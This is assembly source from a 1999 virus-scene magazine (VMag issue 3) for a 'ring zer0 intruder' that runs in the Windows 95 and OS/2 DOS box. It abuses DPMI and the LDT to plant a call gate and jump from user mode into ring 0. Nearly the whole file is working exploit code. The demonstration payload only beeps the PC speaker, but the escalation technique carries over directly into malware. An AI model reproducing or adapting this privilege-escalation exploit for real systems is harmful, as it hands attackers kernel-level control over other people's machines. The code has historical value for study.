;ÚÄÄÚÄ¿ÚÄÄ
;ÄÄÙÃÄÙÄÄÙ Presents
;¿  Ú¿¿ÚÄ´ VMag, Issue 3, 1 January 1999
;ÀÄÙÙ ÙÀÄÙ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

; Windoze'95,OS/2 DOS BOX ring zer0 intruder.
; (c) by Psychomancer,SPS.
; 2:454/5.9@fidonet

; make: tasm  /m ringout.asm
;	tlink /t ringout.obj

model tiny
codeseg
startupcode


intruder	proc	far
		mov	bx,1000h
		mov	ah,4ah
		int	21h			;re-allocate our mcb 4 64kb length
		jb	get_error
		mov	ah,30h
		int	21h
		cmp	al,14h			;os/2 vdm box?
		jne	no_os2vdm
                inc     win_or_os2
no_os2vdm:	mov	ax,1687h
		int	2fh			;check if dpmi available
		and	ax,ax
		je	yes_dpmi
get_error:	lea	dx,error
print:		mov	ah,9
		int	21h			;print message
		.exit
dpmi_alloc:	xor	ax,ax			;allocate ldt descriptor
dpmi_call:	int	31h
		jb	get_error
		retn
yes_dpmi:	mov	dpmi_off,di
		mov	dpmi_seg,es
		mov	bx,si
		mov	ah,48h
		int	21h			;allocate mem 4 dmpi dispatcher
		jb	get_error
		mov	es,ax
		xor	ax,ax			;16bit application
		db	9ah			;switch 2 pm
dpmi_off	dw	?
dpmi_seg	dw	?
		jb	get_error
		lea	si,vendor_str
		mov	ax,168ah
		int	2fh			;get extended api entry point
		and	al,al
		jne	get_error
		mov	extapi_off,di
		mov	extapi_seg,es
		push	ds
		pop	es
		mov	cx,1
		call	dpmi_alloc		;allocate ldt descriptor
		mov	call_gate_slcr,ax
		push	ax
		call	dpmi_alloc		;allocate ldt descriptor
		mov	call_our_slcr,ax
		push	ax
		mov	bx,cs
		lea	di,our_code_desc
		mov	ax,0bh
		call	dpmi_call		;get our code descriptor 2 es:di
		mov	1 ptr [di+5],10011010b	;p=1(present),dpl=0,s=1(appl),type=0a(code:exec/read)
		mov	ax,100h			;100h for win / 101h for os2 vdm
win_or_os2	=	byte ptr $-2
		db	9ah			;get ldt alias selector
extapi_off	dw	?
extapi_seg	dw	?
		jb	get_error
		mov	es,ax
		mov	si,di
		pop	ax
		and	al,not 7
		xchg	di,ax			;calculate descriptor offset
		movsw				;store our patching code descriptor
		movsw
		movsw
		movsw
		pop	ax
		lea	si,call_gate_desc
		and	al,not 7
		xchg	di,ax			;calculate descriptor offset
		movsw				;store call gate descriptor
		movsw
		movsw
		movsw
		db	9ah			;go 2 ring0 throught our call gate
		dw	0
call_gate_slcr	dw	?
		lea	dx,oki
		jmp	print
intruder	endp


ring0_code	proc	far
		cli
		in	al,61h			;we on ring0 now!
		or	al,3
		out	61h,al			;speaker is on
		mov	ax,6
waiting:	loop	waiting
		dec	ax
		jnz	waiting 		;wait
		in	al,61h
		and	al,not 3
		out	61h,al			;speaker is off
		sti
		ret				;return 2 ring3
ring0_code	endp


error		db	'Error ring3-ring0 switching!$'
oki		db	'Ring3-ring0 switching was successfully.$'
vendor_str	db	'MS-DOS',0


call_gate_desc	dw	ring0_code		;offset
call_our_slcr	dw	?			;selector
		db	0
		db	11100100b		;p=1(present),dpl=3,s=0(sys),type=4(call gate)
		dw	0


our_code_desc	db	5 dup (?)		;descriptor our code segment
		db	?			;descriptor type/rights
		dw	?

		end
